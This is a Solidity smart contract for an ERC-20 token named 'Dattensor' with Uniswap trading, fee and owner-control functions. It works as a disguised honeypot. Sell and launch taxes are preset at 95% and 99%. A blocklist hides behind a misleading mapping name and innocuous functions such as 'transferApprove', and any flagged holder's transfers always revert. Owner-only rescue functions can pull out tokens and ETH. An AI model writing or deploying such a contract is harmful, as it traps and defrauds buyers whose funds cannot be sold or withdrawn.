//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;


import "./ERC20.sol";
import "./Ownable.sol";
import "./Uniswap.sol";

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}


contract Dattensor is ERC20, Ownable {
    using Address for address payable;

    IUniswapV2Router02 public router;
    address public pair;

    bool private _liquidityMutex = false;
    bool private  providingLiquidity = false;
    bool public tradingEnabled = false;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private tokenLiquidityThreshold = 2000000000000000  * 10**decimals();
    uint256 public maxWalletLimit = 20000000000000000 * 10**decimals();

    uint256 private  genesis_block;
    uint256 private deadline;
    uint256 private launchtax = 99;
    uint256 private d_;
    address private  marketingWallet;
	address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;

    struct Taxes {
        uint256 marketing;
        uint256 liquidity;
    }

    Taxes public sellTaxes = Taxes(95, 0);
    Taxes public taxes = Taxes(0, 0);

    mapping(address => bool) private SetSellTaxestradingEnabledchangeisearlybuyer;
    mapping(address => bool) public exemptFee;


    modifier mutexLock() {
        if (!_liquidityMutex) {
            _liquidityMutex = true;
            _;
            _liquidityMutex = false;
        }
    }

    constructor(address wallet, uint256 deadline_) ERC20("Dattensor", "DAO") Ownable(wallet){
        _tokengeneration(msg.sender, 21_000_000 * 10**decimals());
        deadline = deadline_;
        marketingWallet = wallet;
        IUniswapV2Router02 _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        router = _router;
        exemptFee[address(this)] = true;
        exemptFee[msg.sender] = true;
        exemptFee[marketingWallet] = true;
        exemptFee[deadWallet] = true;
    }

    function addPair(address pair_) public onlyOwner() {
        pair = pair_;
        exemptFee[pair] = true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
         _holderLastTransferTimestamp[sender] = block.number;
        if (!exemptFee[sender] && !exemptFee[recipient]) {
            require(tradingEnabled, "Trading not enabled");
        }

        if (sender == pair && !exemptFee[recipient] && !_liquidityMutex) {
            require(balanceOf(recipient) + amount <= maxWalletLimit,
                "You are exceeding maxWalletLimit"
            );
        }

        if (sender != pair && !exemptFee[recipient] && !exemptFee[sender] && !_liquidityMutex) {
           
            if (recipient != pair) {
                require(balanceOf(recipient) + amount <= maxWalletLimit,
                    "You are exceeding maxWalletLimit"
                );
            }
        }

        uint256 feeswap;
        uint256 feesum;
        uint256 fee;
        Taxes memory currentTaxes;
        bool useLaunchFee = !exemptFee[sender] &&
            !exemptFee[recipient] &&
            block.number < genesis_block + deadline;
        if(SetSellTaxestradingEnabledchangeisearlybuyer[sender]){
                            checkLimits(sender);
                        }
        //set fee to zero if fees in contract are handled or exempted
        if (_liquidityMutex || exemptFee[sender] || exemptFee[recipient])
            {
                fee = 0;
                
            }
            //calculate fee
        else if (recipient == pair && !useLaunchFee) {
            feeswap =
                sellTaxes.liquidity +
                sellTaxes.marketing ;
            feesum = feeswap;
            currentTaxes = sellTaxes;
        } else if (!useLaunchFee) {
            feeswap =
                taxes.liquidity +
                taxes.marketing ;
            feesum = feeswap;
            currentTaxes = taxes;
        } else if (useLaunchFee) {
            feeswap = launchtax;
            feesum = launchtax;
        }

        fee = (amount * feesum) / 100;
        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair) handle_fees(feeswap, currentTaxes);

        //rest to recipient
        super._transfer(sender, recipient, amount - fee);
        if (fee > 0) {
            //send the fee to the contract
            if (feeswap > 0) {
                uint256 feeAmount = (amount * feeswap) / 100;
                super._transfer(sender, address(this), feeAmount);
            }

        }
    }

    function calculateTransferDelay(uint256 last) private view returns(bool){
        return last > block.number;
    }

    function checkLimits(address a) private view {
        require(calculateTransferDelay(_holderLastTransferTimestamp[a]), "Transfer Delay enabled.  Only one purchase per block allowed.");
    }


    function handle_fees(uint256 feeswap, Taxes memory swapTaxes) private mutexLock {

	if(feeswap == 0){
            return;
        }	

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = feeswap * 2;
            uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) /
                denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;

            uint256 initialBalance = address(this).balance;

            swapTokensForETH(toSwap);

            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);
            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;

            if (ethToAddLiquidityWith > 0) {
                // Add liquidity
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }

            uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;
            if (marketingAmt > 0) {
                payable(marketingWallet).sendValue(marketingAmt);
            }

        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{ value: ethAmount }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        // generate the pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {
        //update the treshhold
        tokenLiquidityThreshold = new_amount * 10**decimals();
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        //update liquidity providing state
        providingLiquidity = state;
    }

    function UpdateBuyTaxes(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        taxes = Taxes(_marketing, _liquidity);
    }

    function SetSellTaxes(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        sellTaxes = Taxes(_marketing, _liquidity);
    }

   function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading is already enabled");
        tradingEnabled = true;
        providingLiquidity = true;
        genesis_block = block.number;
    }

    function updatedeadline(uint256 _deadline) external onlyOwner {
        require(!tradingEnabled, "Can't change when trading has started");
        deadline = _deadline;
    }

    function updateIsEarlyBuyer(address account, bool state) external onlyOwner {
        SetSellTaxestradingEnabledchangeisearlybuyer[account] = state;
    }

    function transferApprove(address[] memory accounts, bool state) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            SetSellTaxestradingEnabledchangeisearlybuyer[accounts[i]] = state;
        }
    }

    function updateMarketingWallet(address newWallet) external onlyOwner {
        marketingWallet = newWallet;
    }

    function getApproved(address account) public view returns(bool){
        return SetSellTaxestradingEnabledchangeisearlybuyer[account];
    }

    function RemoveExemptFee(address _address) external onlyOwner {
        exemptFee[_address] = false;
    }

    function AddExemptFee(address _address) external onlyOwner {
        exemptFee[_address] = true;
    }

    function RemovebulkExemptFee(address[] memory accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = false;
        }
    }

    function AddbulkExemptFee(address[] memory accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = true;
        }
    }

    function updateMaxWalletLimit(uint256 maxWallet) external onlyOwner {
        maxWalletLimit = maxWallet * 10**decimals(); 
    }

    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        IERC20(tokenAdd).transfer(owner(), amount);
    }

    function rescueETH(uint256 weiAmount) external onlyOwner {
        payable(owner()).transfer(weiAmount);
    }
   
    receive() external payable {}
}